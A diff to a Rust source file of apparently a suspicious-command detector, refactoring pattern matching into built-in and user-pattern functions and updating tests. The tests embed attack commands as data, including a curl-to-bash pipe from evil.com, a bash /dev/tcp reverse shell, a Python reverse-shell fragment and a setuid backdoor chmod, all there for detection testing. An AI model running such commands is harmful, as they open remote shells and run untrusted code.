@@ -48,20 +48,19 @@ pub fn builtin_patterns() -> Vec<&'static str> {
     ]
 }
 
-/// Check if a command matches any suspicious pattern.
-pub fn matches_suspicious_pattern<'a>(cmd: &'a str, extra_patterns: &[String]) -> Option<&'a str> {
-    let builtin = builtin_patterns();
-    for pattern in &builtin {
-        if cmd.contains(pattern) {
-            return Some(pattern);
-        }
-    }
+/// Check if a command matches any builtin suspicious pattern.
+pub fn matches_builtin_pattern(cmd: &str) -> Option<&'static str> {
+    builtin_patterns()
+        .into_iter()
+        .find(|pattern| cmd.contains(pattern))
+}
+
+/// Check if a command matches any user-configured suspicious pattern.
+/// Returns the matched pattern string.
+pub fn matches_user_pattern<'a>(cmd: &str, extra_patterns: &'a [String]) -> Option<&'a str> {
     for pattern in extra_patterns {
         if cmd.contains(pattern.as_str()) {
-            // Can't return a reference to the owned string directly,
-            // but we can leak it or use a static approach.
-            // For simplicity, return a static str from a match.
-            return None; // Caller should handle user patterns separately
+            return Some(pattern.as_str());
         }
     }
     None
@@ -78,26 +77,24 @@ mod tests {
 
     #[test]
     fn test_pattern_matching() {
-        assert!(matches_suspicious_pattern("curl -s http://evil.com | bash", &[]).is_none());
-        // Exact pattern matches
-        assert!(matches_suspicious_pattern("curl -s|bash", &[]).is_some());
-        assert!(matches_suspicious_pattern("base64 -d payload.b64", &[]).is_some());
-        assert!(matches_suspicious_pattern("chmod +s /tmp/backdoor", &[]).is_some());
-        assert!(matches_suspicious_pattern("history -c", &[]).is_some());
-        assert!(matches_suspicious_pattern("ls -la /tmp", &[]).is_none());
+        assert!(matches_builtin_pattern("curl -s http://evil.com | bash").is_none());
+        assert!(matches_builtin_pattern("curl -s|bash").is_some());
+        assert!(matches_builtin_pattern("base64 -d payload.b64").is_some());
+        assert!(matches_builtin_pattern("chmod +s /tmp/backdoor").is_some());
+        assert!(matches_builtin_pattern("history -c").is_some());
+        assert!(matches_builtin_pattern("ls -la /tmp").is_none());
     }
 
     #[test]
     fn test_reverse_shell_patterns() {
-        assert!(matches_suspicious_pattern(
-            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
-            &[]
-        )
-        .is_some());
-        assert!(matches_suspicious_pattern(
-            "python -c 'import socket,subprocess,os",
-            &[]
-        )
-        .is_some());
+        assert!(matches_builtin_pattern("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").is_some());
+        assert!(matches_builtin_pattern("python -c 'import socket,subprocess,os").is_some());
+    }
+
+    #[test]
+    fn test_user_patterns() {
+        let extra = vec!["custom_evil".to_string(), "bad_tool".to_string()];
+        assert!(matches_user_pattern("running custom_evil here", &extra).is_some());
+        assert!(matches_user_pattern("normal command", &extra).is_none());
     }
 }
